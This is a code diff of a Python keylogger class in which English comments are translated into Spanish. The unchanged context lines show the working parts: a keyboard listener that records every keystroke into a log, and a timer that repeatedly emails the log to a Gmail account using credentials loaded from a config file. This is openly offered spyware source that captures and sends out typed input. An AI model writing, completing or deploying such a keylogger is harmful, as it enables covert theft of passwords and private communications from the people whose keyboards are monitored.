@@ -13,7 +13,7 @@ import credentials as C # accede al archivo de configuración con las credencial
 
 class KeyLogger:
 
-    # Define __init__ variables
+    # se definen las variables iniciales del objeto
 
     def __init__(self):
         self.interval = C.TIME_INTERVAL
@@ -21,12 +21,12 @@ class KeyLogger:
         self.email = C.FROM
         self.password = C.PASSWORD
 
-    # Create Log which all keystrokes will be appended to
+    # Crea el log donde se guardan las teclas que se han presionado
 
     def append_to_log(self, string):
         self.log = self.log + string
 
-    # Create Keylogger
+    # Crea el Keylogger
 
     def on_press(self, key):
         try:
@@ -43,7 +43,7 @@ class KeyLogger:
         self.append_to_log(current_key)
 
 
-    # Create underlying back structure which will publish emails
+    # Crea la estructura para el envio de los correos electrónicos
 
     def send_mail(self, email, password, message):
         server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -52,7 +52,7 @@ class KeyLogger:
         server.sendmail(email, email, message)
         server.quit()
 
-    # Create Report & Send Email
+    # Envia el correo 
 
     def report_n_send(self):
         send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
@@ -60,7 +60,7 @@ class KeyLogger:
         timer = threading.Timer(self.interval, self.report_n_send)
         timer.start()
 
-    # Start KeyLogger and Send Off Emails
+    # Inicializa el keylogger y el envio de correos
 
     def start(self):
         keyboard_listener = keyboard.Listener(on_press = self.on_press)
